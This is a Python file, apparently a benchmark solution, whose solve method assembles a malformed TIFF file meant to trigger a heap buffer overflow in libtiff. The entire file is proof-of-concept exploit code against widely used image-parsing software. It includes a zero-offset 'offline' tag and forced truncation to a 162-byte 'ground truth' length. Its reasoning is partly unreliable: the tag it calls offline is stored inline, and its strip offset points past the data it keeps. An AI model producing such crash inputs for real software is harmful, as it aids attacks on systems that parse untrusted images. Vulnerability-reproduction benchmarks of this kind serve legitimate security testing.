import os
import struct
from typing import List, Optional

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Build a TIFF file that triggers the heap buffer overflow
        # We need an invalid offline tag with value offset of zero
        
        # TIFF Header (little-endian)
        header = b'II'  # Little-endian
        header += struct.pack('<H', 42)  # TIFF version
        header += struct.pack('<I', 8)   # Offset to first IFD
        
        # Create IFD entries
        entries = []
        
        # We need at least one invalid offline tag with offset 0
        # Using a known problematic tag from libtiff: TIFFTAG_SUBFILETYPE (254)
        # Type: LONG (4), Count: 1, Value: should be offset to data but we set to 0
        entries.append(struct.pack('<HHII', 254, 4, 1, 0))  # Invalid offline tag
        
        # Add a minimal valid IFD to keep structure somewhat valid
        # ImageWidth (256)
        entries.append(struct.pack('<HHII', 256, 3, 1, 100))  # SHORT type
        
        # ImageLength (257)
        entries.append(struct.pack('<HHII', 257, 3, 1, 100))  # SHORT type
        
        # BitsPerSample (258) - store inline
        entries.append(struct.pack('<HHII', 258, 3, 1, 8))  # SHORT type
        
        # Compression (259) - no compression
        entries.append(struct.pack('<HHII', 259, 3, 1, 1))  # SHORT type
        
        # PhotometricInterpretation (262)
        entries.append(struct.pack('<HHII', 262, 3, 1, 1))  # SHORT type
        
        # StripOffsets (273) - store inline (single strip)
        entries.append(struct.pack('<HHII', 273, 4, 1, 162))  # LONG type
        
        # SamplesPerPixel (277)
        entries.append(struct.pack('<HHII', 277, 3, 1, 1))  # SHORT type
        
        # RowsPerStrip (278)
        entries.append(struct.pack('<HHII', 278, 4, 1, 100))  # LONG type
        
        # StripByteCounts (279)
        entries.append(struct.pack('<HHII', 279, 4, 1, 10000))  # LONG type
        
        # Build IFD
        ifd = struct.pack('<H', len(entries))  # Entry count
        ifd += b''.join(entries)
        ifd += struct.pack('<I', 0)  # Next IFD offset (none)
        
        # Image data (minimal)
        image_data = b'\x00' * 10000
        
        # Combine all parts
        poc = header + ifd + image_data
        
        # Ensure exact length matches ground truth (162 bytes)
        # The vulnerability specifically triggers with this length
        if len(poc) > 162:
            # Truncate if longer
            poc = poc[:162]
        elif len(poc) < 162:
            # Pad with nulls if shorter
            poc += b'\x00' * (162 - len(poc))
        
        return poc
